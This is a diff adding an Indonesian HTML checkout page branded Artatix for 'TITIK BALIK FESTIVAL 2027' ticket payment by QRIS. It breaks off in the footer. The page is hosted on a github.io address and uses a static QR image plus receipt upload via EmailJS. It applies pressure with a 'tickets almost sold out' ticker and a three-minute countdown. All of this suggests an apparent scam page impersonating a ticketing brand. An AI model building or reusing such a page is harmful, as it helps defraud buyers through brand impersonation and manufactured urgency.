@@ -1,0 +1,698 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Pembayaran QRIS | Artatix</title>
+<meta name="robots" content="noindex,nofollow">
+<meta name="theme-color" content="#1e348f">
+<meta name="color-scheme" content="light">
+<meta name="description" content="Pembayaran QRIS TITIK BALIK FESTIVAL 2027 — scan, bayar, unggah bukti, dan amankan tiketmu di Artatix.">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://artatixmyid.github.io/titikbalikfest/banner.png">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Artatix">
+<meta property="og:title" content="Pembayaran QRIS | Artatix">
+<meta property="og:description" content="Pembayaran QRIS TITIK BALIK FESTIVAL 2027.">
+<meta property="og:image" content="https://artatixmyid.github.io/titikbalikfest/banner.png">
+<meta property="og:image:alt" content="TITIK BALIK FESTIVAL 2027">
+<meta property="og:image:width" content="1400">
+<meta property="og:image:height" content="520">
+<meta property="og:locale" content="id_ID">
+<meta property="og:url" content="https://artatixmyid.github.io/titikbalikfest/qris.html">
+<link rel="canonical" href="https://artatixmyid.github.io/titikbalikfest/qris.html">
+<link rel="icon" type="image/png" href="logo-saya.png">
+<link rel="apple-touch-icon" href="logo-saya.png">
+<link rel="prefetch" href="success.html">
+<link rel="preload" as="image" href="qris.png" fetchpriority="high">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://api.emailjs.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+[hidden]{display:none!important}
+:root{--navy:#1e348f;--blue:#4353e0;--ink:#141b3d;--muted:#9aa1b5;--soft:#657286;--panel:#edf1fb;--line:#e0e5f3;--red:#e5484d;--red-bg:#fdebeb;--green:#0e9f56;--hot:#d92638;--hot2:#ff7a18}
+html{-webkit-text-size-adjust:100%}
+body{font-family:'Poppins',sans-serif;background:#fff;color:var(--ink);transition:opacity .3s ease;-webkit-tap-highlight-color:transparent}
+body.leaving{opacity:0}
+body.lock{overflow:hidden}
+::selection{background:#dfe5fb}
+:focus-visible{outline:3px solid rgba(67,83,224,.35);outline-offset:2px}
+img{display:block}
+button{font-family:inherit}
+.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap;border:0}
+.page{max-width:520px;margin:0 auto;padding:0 20px}
+.topbar{padding:10px 0 8px;background:#fff}
+.bar-inner{display:flex;align-items:center;justify-content:space-between;gap:12px}
+.brand{display:block;text-decoration:none}
+.brand img{width:148px;max-height:36px;object-fit:contain;object-position:left center}
+.lang{display:inline-flex;align-items:center;gap:6px;padding:6px 10px;border:1px solid #e8edf5;border-radius:999px;background:#f5f7fb;font-size:12px;font-weight:700;color:#16213b}
+.progress{background:var(--navy);margin:0 -20px;padding:14px 20px 12px}
+.progress-track{height:4px;background:rgba(255,255,255,.18);border-radius:99px;overflow:hidden;margin-bottom:12px}
+.progress-fill{height:100%;background:#fff;border-radius:99px;width:75%}
+.steps{list-style:none;display:flex;align-items:center;gap:8px}
+.step{display:flex;align-items:center;gap:8px;flex:1;justify-content:center;min-width:0}
+.dot{width:30px;height:30px;border-radius:50%;display:grid;place-items:center;font-weight:700;font-size:13px;color:#fff;border:2px solid rgba(255,255,255,.55);flex:none}
+.step.done .dot{background:rgba(255,255,255,.18);border-color:rgba(255,255,255,.4)}
+.step.active .dot{background:#fff;color:var(--navy);border-color:#fff}
+.step-label{color:#fff;font-weight:600;font-size:12.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ticker{position:relative;overflow:hidden;margin-top:20px;border-radius:16px;background:linear-gradient(90deg,var(--hot),var(--hot2),var(--hot));background-size:220% 100%;box-shadow:0 10px 26px rgba(217,38,56,.32),inset 0 0 0 1px rgba(255,255,255,.25);animation:rise .55s cubic-bezier(.2,.7,.3,1) backwards,tickerBg 6s linear infinite}
+.ticker::before,.ticker::after{content:"";position:absolute;top:0;bottom:0;width:34px;z-index:2;pointer-events:none}
+.ticker::before{left:0;background:linear-gradient(90deg,rgba(217,38,56,.95),transparent)}
+.ticker::after{right:0;background:linear-gradient(-90deg,rgba(217,38,56,.95),transparent)}
+.ticker-track{display:flex;width:max-content;padding:10px 0;will-change:transform;animation:tickerMove 15s linear infinite}
+.t-group{display:flex;align-items:center;flex:none}
+.t-item{display:inline-flex;align-items:center;gap:8px;padding:0 22px;color:#fff;font-size:13.5px;font-weight:800;letter-spacing:.6px;text-transform:uppercase;white-space:nowrap;text-shadow:0 1px 2px rgba(0,0,0,.18)}
+.t-warn{display:inline-block;font-size:15px;animation:blink .85s ease-in-out infinite}
+@keyframes tickerMove{to{transform:translateX(-50%)}}
+@keyframes tickerBg{to{background-position:220% 0}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.35}}
+.checkout-content{padding-bottom:0}
+.section-heading{display:inline-flex;align-items:center;gap:9px;background:var(--blue);color:#fff;font-size:16px;font-weight:700;padding:12px 20px;border-radius:999px;margin:24px 0 16px;box-shadow:0 6px 16px rgba(67,83,224,.28)}
+.section-heading svg{width:18px;height:18px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.summary-card{background:var(--panel);border-radius:22px;padding:16px;margin-top:16px;animation:rise .45s cubic-bezier(.2,.7,.3,1) backwards}
+main section:nth-of-type(2){animation-delay:.05s}
+main section:nth-of-type(3){animation-delay:.1s}
+@keyframes rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+.summary-title{font-size:15px;font-weight:700;color:var(--navy);margin-bottom:12px}
+.meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.meta{background:#fff;border-radius:14px;padding:11px 13px}
+.meta.wide{grid-column:1/-1}
+.meta span{display:block;font-size:10.5px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;color:var(--muted)}
+.meta strong{display:block;font-size:13.5px;font-weight:700;margin-top:3px;word-break:break-word;font-variant-numeric:tabular-nums}
+.meta.total strong{color:var(--navy);font-size:16px}
+.qris-card{position:relative;overflow:hidden;background:linear-gradient(150deg,#16255f 0%,var(--navy) 40%,#3a4bd6 100%);border-radius:22px;padding:16px;margin-top:16px;animation:rise .45s cubic-bezier(.2,.7,.3,1) backwards;box-shadow:0 14px 34px rgba(22,37,95,.28)}
+.qris-card::before,.qris-card::after{content:"";position:absolute;border-radius:50%;pointer-events:none}
+.qris-card::before{width:190px;height:190px;background:rgba(255,255,255,.08);top:-80px;right:-60px}
+.qris-card::after{width:130px;height:130px;background:rgba(255,255,255,.05);bottom:-60px;left:-45px}
+.qris-head{position:relative;z-index:1;display:flex;align-items:center;justify-content:space-between;gap:10px;padding:2px 2px 12px}
+.qris-badge{display:inline-flex;align-items:center;gap:7px;color:#fff;font-weight:800;font-size:13px;letter-spacing:.14em;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.28);border-radius:999px;padding:7px 14px}
+.qris-badge svg{width:14px;height:14px;fill:#ffd166}
+.timer{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,.94);color:var(--navy);font-weight:800;font-size:15px;padding:8px 15px;border-radius:999px;font-variant-numeric:tabular-nums;box-shadow:0 4px 12px rgba(10,20,60,.28);transition:background .3s,color .3s}
+.timer svg{width:16px;height:16px;fill:none;stroke:currentColor;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+.timer.urgent{background:var(--red);color:#fff;animation:urgent 1s ease-in-out infinite}
+@keyframes urgent{0%,100%{box-shadow:0 0 0 0 rgba(229,72,77,.55)}50%{box-shadow:0 0 0 9px rgba(229,72,77,0)}}
+.pay-list{position:relative;z-index:1;display:flex;flex-wrap:wrap;justify-content:center;gap:6px;margin:0 2px 12px}
+.pay-list span{background:rgba(255,255,255,.13);border:1px solid rgba(255,255,255,.22);color:#fff;border-radius:999px;padding:4px 11px;font-size:10.5px;font-weight:600}
+.qris-inner{position:relative;z-index:1;background:#fff;border-radius:18px;padding:20px 18px 16px;box-shadow:0 10px 26px rgba(10,20,60,.22);text-align:center}
+.qris-frame{position:relative;width:max-content;max-width:100%;margin:0 auto;padding:12px}
+.qris-img{display:block;width:100%;max-width:240px;height:auto;aspect-ratio:auto 461/475;margin:0 auto;border-radius:10px}
+.corner{position:absolute;width:24px;height:24px;border:3px solid var(--blue)}
+.corner.tl{top:0;left:0;border-right:0;border-bottom:0;border-radius:10px 0 0 0}
+.corner.tr{top:0;right:0;border-left:0;border-bottom:0;border-radius:0 10px 0 0}
+.corner.bl{bottom:0;left:0;border-right:0;border-top:0;border-radius:0 0 0 10px}
+.corner.br{bottom:0;right:0;border-left:0;border-top:0;border-radius:0 0 10px 0}
+.scan-line{position:absolute;left:8px;right:8px;height:3px;border-radius:99px;background:linear-gradient(90deg,transparent,#4353e0 35%,#7c8af5 50%,#4353e0 65%,transparent);opacity:.65;animation:scan 2.8s ease-in-out infinite;pointer-events:none}
+@keyframes scan{0%,100%{top:12px}50%{top:calc(100% - 15px)}}
+.order-chip{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:14px;font-size:12px;color:var(--soft)}
+.order-chip strong{color:var(--navy);font-weight:700;letter-spacing:.02em}
+.chip-copy{display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;border:0;background:var(--blue);color:#fff;border-radius:8px;cursor:pointer;transition:transform .15s,background .2s;touch-action:manipulation}
+.chip-copy:active{transform:scale(.9)}
+.chip-copy svg,.copy-btn svg{width:14px;height:14px;fill:none;stroke:currentColor;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+.chip-copy.copied,.copy-btn.copied{background:var(--green);box-shadow:0 4px 12px rgba(14,159,86,.35)}
+.amount-box{margin-top:10px;background:#f4f6fd;border:1px solid #dfe4f8;border-radius:16px;padding:14px 16px}
+.amount-box>span{display:block;font-size:10.5px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.amount-row{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:4px}
+.amount-row strong{font-size:26px;font-weight:800;color:var(--navy);letter-spacing:-.6px;font-variant-numeric:tabular-nums}
+.copy-btn{display:inline-flex;align-items:center;gap:6px;border:0;background:linear-gradient(135deg,#4d5ce8,#4353e0);color:#fff;font-size:12.5px;font-weight:700;padding:10px 14px;border-radius:11px;cursor:pointer;box-shadow:0 4px 12px rgba(67,83,224,.3);transition:transform .15s,background .2s,box-shadow .2s;touch-action:manipulation;flex:none}
+.copy-btn:active{transform:scale(.95)}
+.pay-steps{margin:16px 0 0;padding:0;list-style:none;display:grid;gap:8px;text-align:left}
+.pay-steps li{display:flex;align-items:flex-start;gap:10px;font-size:12.5px;line-height:1.6;color:var(--soft)}
+.pay-steps li span{flex:none;width:20px;height:20px;border-radius:50%;background:#e7ebfc;color:var(--blue);font-size:11px;font-weight:700;display:grid;place-items:center;margin-top:1px}
+.upload{display:flex;flex-direction:column;align-items:center;text-align:center;gap:4px;border:2px dashed #c9d2ee;border-radius:16px;background:#f7f9ff;padding:24px 16px;cursor:pointer;transition:border-color .15s,background .15s,transform .15s;touch-action:manipulation}
+.upload:hover,.upload.drag{border-color:var(--blue);background:#eef1fe}
+.upload.drag{transform:scale(1.01)}
+.upload.kb-focus{border-color:var(--blue);box-shadow:0 0 0 4px rgba(67,83,224,.16)}
+.upload svg{width:34px;height:34px;fill:none;stroke:var(--blue);stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;margin-bottom:5px}
+.upload strong{font-size:14px}
+.upload span{font-size:12px;color:var(--muted)}
+.upload span:last-child{font-size:11px}
+.input-file{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap;border:0}
+.preview{margin-top:14px;background:#f7f9ff;border:1px solid var(--line);border-radius:16px;padding:12px;animation:rise .3s ease backwards}
+.preview img{width:100%;max-height:260px;object-fit:contain;border-radius:10px;background:#fff}
+.preview-row{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:9px}
+.preview-name{font-size:12px;color:var(--soft);word-break:break-all}
+.remove{display:inline-flex;align-items:center;gap:6px;border:0;background:var(--red-bg);color:var(--red);font-size:12px;font-weight:600;padding:7px 12px;border-radius:9px;cursor:pointer;flex:none;transition:transform .15s,background .15s;touch-action:manipulation}
+.remove:hover{background:#fbdedd}
+.remove svg{width:13px;height:13px;fill:none;stroke:currentColor;stroke-width:2.4;stroke-linecap:round}
+.remove:active{transform:scale(.94)}
+.primary{width:100%;margin-top:16px;border:0;border-radius:14px;padding:15px;font-size:17px;font-weight:700;color:#fff;background:linear-gradient(180deg,#4d5ce8,#4353e0);box-shadow:0 8px 20px rgba(67,83,224,.32);cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:transform .15s,box-shadow .2s,opacity .2s;touch-action:manipulation;-webkit-user-select:none;user-select:none}
+.primary svg{width:18px;height:18px;fill:none;stroke:#fff;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;transition:transform .2s}
+.primary:disabled{background:#aeb9f0;box-shadow:none;cursor:not-allowed}
+.primary:not(:disabled){animation:btnPulse 2.4s ease-in-out infinite}
+.primary:not(:disabled):hover{box-shadow:0 10px 24px rgba(67,83,224,.42)}
+.primary:not(:disabled):hover svg{transform:translateX(3px)}
+.primary:not(:disabled):active{transform:scale(.99)}
+@keyframes btnPulse{0%,100%{box-shadow:0 8px 20px rgba(67,83,224,.32)}50%{box-shadow:0 10px 30px rgba(67,83,224,.58)}}
+.btn-hint{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:10px;font-size:11.5px;line-height:1.5;color:var(--muted);text-align:center;transition:color .25s}
+.btn-hint.ok{color:var(--green);font-weight:600}
+.info-box{display:flex;gap:10px;background:#f7f9ff;border:1px solid var(--line);border-radius:14px;padding:13px 14px;font-size:12px;line-height:1.65;color:var(--soft);margin-top:16px}
+.info-box svg{width:16px;height:16px;flex:none;fill:none;stroke:var(--blue);stroke-width:2;stroke-linecap:round;stroke-linejoin:round;margin-top:2px}
+.toast{position:fixed;left:50%;bottom:90px;transform:translate(-50%,14px) scale(.97);z-index:90;background:#1c2440;color:#fff;font-size:14px;font-weight:500;padding:11px 18px;border-radius:12px;max-width:calc(100vw - 40px);text-align:center;opacity:0;pointer-events:none;box-shadow:0 12px 30px rgba(0,0,0,.28);transition:opacity .25s,transform .25s}
+.toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
+.artatix-footer{width:100%;margin:52px 0 0;padding:0 0 34px;background:#fff;color:#111827;text-align:center}
+.artatix-footer-inner{max-width:680px;margin:0 auto;padding:0 24px}
+.artatix-footer-logo{display:flex;align-items:center;justify-content:center;margin:0 auto 42px}
+.artatix-footer-logo img{display:block;width:min(190px,58vw);height:auto;object-fit:contain}
+.artatix-footer-contact-list{display:grid;justify-items:center;gap:20px}
+.artatix-footer-contact{display:flex;align-items:center;justify-content:center;gap:12px;min-height:42px;color:#111827;text-decoration:none;font-size:17px;line-height:1.35;font-weight:500;letter-spacing:.005em}
+.artatix-footer-contact:hover,.artatix-footer-contact:focus-visible{color:#111827}
+.artatix-footer-icon{width:38px;height:38px;flex:0 0 38px;display:grid;place-items:center;color:#315fe8}
+.artatix-footer-icon svg{width:30px;height:30px;display:block;fill:currentColor}
+.artatix-footer-icon.mail svg{width:29px;height:29px}
+.artatix-footer-divider{width:100%;height:1px;margin:40px auto 38px;background:#dfe4ea}
+.artatix-footer-copy{margin:0;color:#718095;font-size:16px;line-height:1.55;font-weight:400;letter-spacing:.005em}
+@media (min-width:700px){.artatix-footer-inner{padding:0 48px}.artatix-footer-logo img{width:235px}.artatix-footer-contact{font-size:20px;gap:14px}.artatix-footer-icon{width:42px;height:42px;flex-basis:42px}.artatix-footer-icon svg{width:33px;height:33px}.artatix-footer-icon.mail svg{width:32px;height:32px}.artatix-footer-copy{font-size:19px}}
+@media (max-width:380px){.artatix-footer-inner{padding:0 18px}.artatix-footer-logo{margin-bottom:36px}.artatix-footer-logo img{width:min(180px,62vw)}.artatix-footer-contact{font-size:15px}.artatix-footer-icon{width:36px;height:36px;flex-basis:36px}.artatix-footer-icon svg{width:28px;height:28px}.artatix-footer-icon.mail svg{width:27px;height:27px}.artatix-footer-divider{margin-top:36px;margin-bottom:32px}.artatix-footer-copy{font-size:14px}}
+.premium-payment-loading{position:fixed;inset:0;z-index:9999;display:grid;place-items:center;overflow:hidden;background:linear-gradient(145deg,#07143d 0%,#10266f 45%,#263fd0 100%);opacity:0;visibility:hidden;pointer-events:none;transition:opacity .45s ease,visibility .45s ease}
+.premium-payment-loading.active{opacity:1;visibility:visible;pointer-events:auto}
+.premium-loading-bg{position:absolute;inset:0;overflow:hidden;pointer-events:none}
+.premium-loading-bg::before{content:"";position:absolute;inset:-30%;background:radial-gradient(circle at 20% 20%,rgba(112,145,255,.28),transparent 30%),radial-gradient(circle at 80% 70%,rgba(75,225,255,.16),transparent 28%),radial-gradient(circle at 50% 50%,rgba(255,255,255,.05),transparent 36%);animation:premiumBg 9s ease-in-out infinite alternate}
+.premium-loading-bg span{position:absolute;border:1px solid rgba(255,255,255,.08);border-radius:50%;animation:premiumFloat 9s ease-in-out infinite}
+.premium-loading-bg span:nth-child(1){width:420px;height:420px;left:-170px;top:-130px}
+.premium-loading-bg span:nth-child(2){width:620px;height:620px;right:-260px;bottom:-260px;animation-delay:-3s}
+.premium-loading-bg span:nth-child(3){width:260px;height:260px;left:50%;top:50%;margin:-130px;animation-delay:-6s}
+.premium-loading-card{position:relative;z-index:2;width:min(430px,calc(100vw - 42px));padding:34px 28px 28px;border:1px solid rgba(255,255,255,.16);border-radius:30px;background:linear-gradient(180deg,rgba(255,255,255,.14),rgba(255,255,255,.07));box-shadow:0 30px 90px rgba(0,0,0,.38),inset 0 1px 0 rgba(255,255,255,.2);backdrop-filter:blur(22px);-webkit-backdrop-filter:blur(22px);text-align:center;color:#fff}
+.premium-loading-logo{width:min(210px,70vw);height:auto;margin:0 auto 30px;filter:brightness(0) invert(1);object-fit:contain}
+.premium-loader-ring{width:94px;height:94px;margin:0 auto 25px;border-radius:50%;display:grid;place-items:center;background:conic-gradient(#fff 0deg,rgba(255,255,255,.16) 0deg);animation:premiumSpin 1.1s linear infinite;position:relative}
+.premium-loader-ring::before{content:"";width:72px;height:72px;border-radius:50%;background:#142d82;box-shadow:inset 0 0 24px rgba(255,255,255,.08)}
+.premium-loader-ring span{position:absolute;width:10px;height:10px;border-radius:50%;background:#fff;top:5px;left:42px;box-shadow:0 0 18px rgba(255,255,255,.9)}
+.premium-loading-title{font-size:21px;font-weight:800;letter-spacing:.01em;min-height:28px;will-change:opacity,transform}
+.premium-loading-subtitle{margin:9px auto 23px;max-width:330px;min-height:42px;color:rgba(255,255,255,.72);font-size:12.5px;line-height:1.65;will-change:opacity,transform}
+.premium-loading-progress{height:7px;width:100%;overflow:hidden;border-radius:99px;background:rgba(255,255,255,.14);box-shadow:inset 0 1px 2px rgba(0,0,0,.18)}
+.premium-loading-progress span{display:block;width:0;height:100%;border-radius:inherit;background:linear-gradient(90deg,#fff,#9eb4ff);box-shadow:0 0 16px rgba(255,255,255,.35);transition:width .25s linear}
+.premium-loading-time{display:flex;align-items:center;justify-content:center;gap:9px;margin-top:17px;flex-wrap:wrap}
+.premium-loading-time strong{font-size:24px;font-variant-numeric:tabular-nums;letter-spacing:.04em}
+.premium-loading-time span{font-size:11px;color:rgba(255,255,255,.58)}
+.premium-loading-time .premium-loading-pct{font-size:15px;font-weight:800;color:#9eb4ff;letter-spacing:.02em}
+.premium-loading-note{margin:12px 0 0;font-size:10.5px;letter-spacing:.05em;color:rgba(255,255,255,.5)}
+.premium-loading-order{margin-top:20px;padding-top:15px;border-top:1px solid rgba(255,255,255,.1);font-size:9px;letter-spacing:.16em;color:rgba(255,255,255,.45)}
+.premium-loading-order b{color:rgba(255,255,255,.82);font-weight:700}
+.swap{animation:msgIn .55s cubic-bezier(.2,.7,.3,1)}
+@keyframes msgIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@keyframes premiumSpin{to{transform:rotate(360deg)}}
+@keyframes premiumBg{to{transform:scale(1.08) rotate(3deg)}}
+@keyframes premiumFloat{0%,100%{transform:translate3d(0,0,0) scale(1)}50%{transform:translate3d(18px,-20px,0) scale(1.04)}}
+.premium-payment-loading.final-countdown .premium-loading-time strong{color:#ff5b66;text-shadow:0 0 22px rgba(255,91,102,.65);animation:finalPulse .9s ease-in-out infinite}
+.premium-payment-loading.final-countdown .premium-loading-pct{color:#ff97a1}
+.premium-payment-loading.final-countdown .premium-loading-note{color:rgba(255,151,161,.8)}
+.premium-payment-loading.final-countdown .premium-loader-ring{background:conic-gradient(#ff5b66 0deg,rgba(255,255,255,.16) 0deg)}
+.premium-payment-loading.final-countdown .premium-loader-ring span{background:#ff5b66;box-shadow:0 0 18px rgba(255,91,102,.95)}
+.premium-payment-loading.final-countdown .premium-loading-progress span{background:linear-gradient(90deg,#ff5b66,#ffa2ab);box-shadow:0 0 16px rgba(255,91,102,.55)}
+@keyframes finalPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.15)}}
+@media (max-width:430px){.step-label{display:none}.step.active .step-label{display:inline}.meta-grid{grid-template-columns:1fr}.amount-row strong{font-size:22px}.qris-badge{font-size:11.5px;padding:6px 11px}.timer{font-size:13.5px;padding:7px 12px}.t-item{padding:0 14px;font-size:12px}.premium-loading-card{padding:29px 21px 23px;border-radius:26px}.premium-loading-logo{width:185px;margin-bottom:24px}.premium-loader-ring{width:84px;height:84px}.premium-loader-ring::before{width:64px;height:64px}.premium-loader-ring span{left:37px}.premium-loading-title{font-size:19px}.premium-loading-subtitle{font-size:11.5px}.premium-loading-time strong{font-size:22px}}
+@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}.scan-line{display:none}}
+</style>
+</head>
+<body>
+<div class="page">
+<header class="topbar"><div class="bar-inner">
+<a class="brand" href="index.html" aria-label="Artatix beranda"><img src="logo-artatix.png" alt="Artatix" width="148" height="39" decoding="async"></a>
+<span class="lang"><span aria-hidden="true">🇮🇩</span> ID</span>
+</div></header>
+<nav class="progress" aria-label="Langkah pemesanan"><div class="progress-track"><div class="progress-fill"></div></div><ol class="steps"><li class="step done"><span class="dot">✓</span><span class="step-label">Pilih Kategori</span></li><li class="step done"><span class="dot">✓</span><span class="step-label">Data Pembeli</span></li><li class="step active" aria-current="step"><span class="dot">3</span><span class="step-label">Pembayaran</span></li><li class="step"><span class="dot">4</span><span class="step-label">E-Ticket</span></li></ol></nav>
+<aside class="ticker" aria-label="Peringatan stok tiket">
+<p class="sr-only">Peringatan: tiket hampir sold out. Selesaikan pembayaran sebelum waktu habis.</p>
+<div class="ticker-track" aria-hidden="true">
+<div class="t-group">
+<span class="t-item"><span class="t-warn">⚠️</span>TIKET HAMPIR SOLD OUT</span>
+<span class="t-item">⏱ SELESAIKAN PEMBAYARAN</span>
+<span class="t-item">🔥 AMANKAN TIKETMU SEKARANG</span>
+</div>
+<div class="t-group">
+<span class="t-item"><span class="t-warn">⚠️</span>TIKET HAMPIR SOLD OUT</span>
+<span class="t-item">⏱ SELESAIKAN PEMBAYARAN</span>
+<span class="t-item">🔥 AMANKAN TIKETMU SEKARANG</span>
+</div>
+</div>
+</aside>
+<main class="checkout-content">
+<h1 class="section-heading"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><path d="M14 14h3v3h-3z"/><path d="M21 14v.01M17.5 17.5v.01M21 21v.01M14 21v.01"/></svg>Pembayaran QRIS</h1>
+<section class="summary-card"><div class="summary-title">Detail Pesanan</div>
+<div class="meta-grid">
+<div class="meta wide"><span>Order ID</span><strong id="orderId">-</strong></div>
+<div class="meta"><span>Nama</span><strong id="namaPemesan">-</strong></div>
+<div class="meta"><span>Jumlah Tiket</span><strong id="jumlahTiket">0</strong></div>
+<div class="meta wide"><span>Jenis Tiket</span><strong id="jenisTiket">-</strong></div>
+<div class="meta total wide"><span>Total Pembayaran</span><strong id="total">Rp0</strong></div>
+</div></section>
+<section class="qris-card">
+<div class="qris-head">
+<span class="qris-badge"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2l2.4 5.9 6.1 2.3-6.1 2.3L12 18.4 9.6 12.5 3.5 10.2l6.1-2.3Z"/></svg>QRIS</span>
+<span class="timer" id="timerBox" role="timer"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2.5"/><path d="M9 2h6"/></svg><span id="timer">03:00</span></span>
+</div>
+<div class="pay-list" aria-label="Aplikasi pendukung"><span>GoPay</span><span>OVO</span><span>DANA</span><span>ShopeePay</span><span>LinkAja</span><span>M-Banking</span></div>
+<div class="qris-inner">
+<div class="qris-frame">
+<img class="qris-img" src="qris.png" alt="QRIS pembayaran TITIK BALIK FESTIVAL 2027" width="461" height="475" fetchpriority="high" decoding="async">
+<span class="corner tl" aria-hidden="true"></span><span class="corner tr" aria-hidden="true"></span><span class="corner bl" aria-hidden="true"></span><span class="corner br" aria-hidden="true"></span>
+<span class="scan-line" aria-hidden="true"></span>
+</div>
+<div class="order-chip"><span>Order ID</span><strong id="orderChipId">-</strong><button class="chip-copy" id="copyOrder" type="button" aria-label="Salin Order ID"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button></div>
+<div class="amount-box">
+<span>Total Pembayaran</span>
+<div class="amount-row">
+<strong id="totalQr">Rp0</strong>
+<button class="copy-btn" id="copyTotal" type="button"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span id="copyTotalLabel">Salin Nominal</span></button>
+</div>
+</div>
+<ol class="pay-steps">
+<li><span>1</span>Buka aplikasi e-wallet atau mobile banking favoritmu.</li>
+<li><span>2</span>Pindai kode QR di atas, lalu masukkan nominal yang tertera.</li>
+<li><span>3</span>Selesaikan pembayaran, simpan struk, lalu unggah bukti di bawah.</li>
+</ol>
+</div>
+</section>
+<section class="summary-card"><div class="summary-title">Unggah Bukti Pembayaran</div>
+<label class="upload" id="drop" for="file">
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/></svg>
+<strong>Upload Bukti Pembayaran</strong>
+<span>Klik untuk memilih atau seret &amp; letakkan di sini</span>
+<span>JPG, JPEG, PNG, WebP • maksimal 8 MB</span>
+</label>
+<input id="file" type="file" accept="image/jpeg,image/png,image/webp" class="input-file">
+<div class="preview" id="preview" hidden>
+<img id="previewImg" alt="Preview bukti pembayaran" decoding="async">
+<div class="preview-row"><div class="preview-name" id="fileName"></div><button class="remove" id="removeFile" type="button"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>Hapus</button></div>
+</div>
+<button class="primary" id="btn" type="button" disabled><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Konfirmasi Pembayaran</button>
+<p class="btn-hint" id="btnHint">Unggah bukti pembayaran untuk mengaktifkan tombol konfirmasi</p>
+</section>
+<div class="info-box"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 8v.01M12 11v5"/></svg><div>Pastikan nominal transfer sesuai dan bukti pembayaran terlihat jelas. Tim kami akan memverifikasi pembayaranmu, lalu e-ticket dikirim ke e-mail dan WhatsApp-mu.</div></div>
+</main>
+<footer class="artatix-footer" aria-label="Informasi Artatix">
+<div class="artatix-footer-inner">
+<a class="artatix-footer-logo" href="index.html" aria-label="Artatix — kembali ke beranda">
+<img src="logo-artatix.png" alt="Artatix" width="235" height="54" loading="lazy" decoding="async">
+</a>
+<div class="artatix-footer-contact-list">
+<a class="artatix-footer-contact" href="https://wa.me/6282137676220" target="_blank" rel="noopener noreferrer" aria-label="WhatsApp Artatix">
